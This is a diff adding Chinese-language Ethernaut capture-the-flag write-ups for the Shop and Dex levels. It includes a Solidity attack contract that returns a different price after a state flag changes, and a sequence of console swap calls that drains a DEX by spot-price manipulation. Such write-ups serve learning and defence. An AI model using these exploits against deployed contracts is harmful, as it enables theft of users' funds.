@@ -405,3 +405,48 @@ contract Attack {
 }
 ```
 这也是为什么调用外部的call时应显式指定gas。另外，外部的call最多能使用当前gas的 $\frac{63}{64}$ ，所以如果在最开始就给足gas，使 $\frac{1}{64}$ 的gas足够覆盖剩余的逻辑，也不会出现这题的dos（denial of service）问题（但是何必呢？）
+
+## Shop
+
+view函数相比于普通的函数，不能修改状态变量、触发事件（Event）、发送/接收以太币、创建新合约、调用普通函数（view和pure函数除外）
+
+问题在于Shop调用了两次price函数，给了攻击者修改返回值的时机。有点类似之前的`Elevator`，但是不能通过修改全局变量使函数返回不同的值
+
+Shop先更新isSold再更新price,于是可以利用isSold作为开关
+```solidity
+contract Attack is Buyer {
+    Shop target=Shop(address());
+    function price() external view override returns (uint256) {
+        if(target.isSold()){
+            return 0;
+        }
+        return 101;
+    }
+    function exploit() public {
+        target.buy();
+    }
+}
+```
+## Dex
+
+左脚踩右脚上天了（
+
+套一下swap函数的逻辑，发现从第二次swap开始，我们有的总token数量将越来越多：
+1. 10 token1 -> 10 token2(10*100/100=10)
+2. 20(10+10，原本我们自己也有10个) token2 -> 24 token1(20*110/90=24)
+3. 24 token1 -> 30 token2(24*(90+20)/(110-24))
+4. ...
+
+很明显重复以上步骤后总会消耗完token1或者token2。这里我直接拿console做了
+```js
+let token1=await contract.token1()
+let token2=await contract.token2()
+await contract.approve(instance,1000) //approve可以允许对方使用大于自己balance的token
+await contract.swap(token1,token2,10)
+await contract.swap(token2,token1,20)
+await contract.swap(token1,token2,24)
+await contract.swap(token2,token1,30)
+await contract.swap(token1,token2,41)
+await contract.swap(token2,token1,45)
+//最后先耗尽token1
+```
